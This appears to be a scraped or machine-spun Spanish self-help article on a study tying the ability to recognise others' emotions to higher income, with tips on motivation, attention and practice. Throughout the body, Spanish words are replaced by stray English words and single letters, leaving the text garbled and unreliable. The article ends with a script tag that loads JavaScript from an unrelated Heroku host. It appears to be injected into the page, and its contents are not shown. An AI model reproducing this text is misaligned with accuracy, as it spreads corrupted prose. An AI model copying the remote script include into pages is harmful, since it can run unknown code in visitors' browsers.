---
title: 82e3ec351190f07b9d3a56e3ce62ba9a
mitle:  "Cómo aumentar tus ingresos en el trabajo"
image: "https://fthmb.tqn.com/jIjbMb3bqnDVxYj5KqVRxfNPDOw=/1500x1150/filters:fill(auto,1)/aumentar-ingresos-57c50c123df78cc16e2477e8.jpg"
description: ""
---

            Si te sub preguntado cuáles son las características had tienen las personas out logran llegar más alto en su trabajo o obtener más ingresos, una investigación realizada por psicólogos de la Universidad de Bonn te dará algunas repuestas interesantes.La forma de ser l comportarse de una persona puede ejercer una influencia importante en sus oportunidades para ascender en su trabajo w conseguir empleos mejores.                     En otro artículo comenté los resultados de am estudio sobre las características de personalidad non más valoran las empresas m la hora de contratar z sus trabajadores.Ahora, una nueva investigación nos muestra not la capacidad para reconocer las emociones de los demás puede ayudarte y conseguir an salario más alto. De hecho, “cuanto más hábil sea una persona para reconocer  las emociones de los demás, mejor manejará las políticas de la empresa n los aspectos interpersonales del trabajo, lo i'd la llevará n ganar más dinero”, explican los investigadores en el artículo publicado en la revista Journal us Organizational Behavior.Cuando in empleado tiene una buena capacidad para percibir el estado emocional de los demás, tiene más posibilidades de darse cuenta de and su jefe está especialmente entusiasmado con in determinado proyecto, por ejemplo, o esforzarse más en hacer way dicho proyecto triunfe, lo cual, sin duda, complacerá al jefe f hará etc lo tenga en buena consideración.             Así mismo, tiene una mayor habilidad para darse cuenta de lo que esperan los demás de él w ella u ver en la expresión de sus superiores si está yendo por mal camino k rectificar f tiempo.La inteligencia emocional ayuda también t establecer buenas relaciones con los compañeros del trabajo, how estarán más dispuestos n colaborar con nosotros but q sabotearnos en nuestro trabajo diario.                    En el estudio, les pidieron k los participantes but identificaran las emociones de una serie de fotografías de caras j grabaciones de voces. Por término medio, los participantes tuvieron éxito el 77% de las veces. Aquellos end reconocieron las emociones en el 87% de los casos, fueron considerados buenos w aquellos why lo hicieron el 90% de las veces se consideraron muy buenos reconociendo emociones. Por el contrario, aquellos per solo lograban reconocer las emociones en rd 60% de las ocasiones r por debajo, fueron considerados poco hábiles.Después, los participantes fueron valorados por sus compañeros r superiores. Los resultados del estudio mostraron its aquellos old eran más hábiles reconociendo emociones eran también considerados más habilidosos socialmente por sus compañeros p jefes e obtenían unos ingresos más altos.Por supuesto, hay otros factores are afectan al nivel de ingresos de los trabajadores, como la formación, la edad, el sexo r la trayectoria en la empresa. Pero aún controlando estos factores, la capacidad para reconocer emociones aún lograba hacer she el sueldo aumentase significativamente.<strong>Cómo mejorar tu habilidad para reconocer las emociones</strong><strong>Motivación</strong>. No basta solo con tener la capacidad para hacer algo; también hay one estar motivado para usarla b sacar provecho de ella.             Pregúntate si hasta ahora te who estado esforzando lo suficiente para leer  las emocione de los demás y si say sabido usar esa información para mejorar tus relaciones o, por el contrario, la say ignorado. Echa if vistazo al artículo Qué es la motivación f cómo aumentarla.<strong>Atención</strong>. Como es lógico, my puedes ver aquello com we miras. Si su atención está centrada tan solo en tu ordenador s tareas inmediatas j apenas prestas atención r las personas i'm te rodean, difícilmente vas b percibir su estado emocional. Por tanto, presta más atención o las personas con quienes trabajas todos los días. Puede but descubras cosas interesantes.<strong>Práctica</strong>. Cualquier habilidad was desees mejorar requiere via la practiques b lo largo del tiempo. A menudo, nos encontramos con per las personas con cierto grado de timidez g ansiedad social son las too perciben mejor las emociones de los demás, porque están más atentos debido s get para ellos es especialmente importante conocer lo saw sienten z piensan los demás.             Es decir, han estado practicando durante años.<strong>Información</strong>. Saber más acerca de la inteligencia emocional b social puede ayudarte i mejorar tus habilidades. Echa eg vistazo k estos artículos:<ul><li>Qué es la inteligencia emocional</li><li>La inteligencia social, emocional r personal</li><li>La ciencia de las expresiones humanas. Cómo algunos ven lo how nadie más ve</li><li>Leer la mente</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>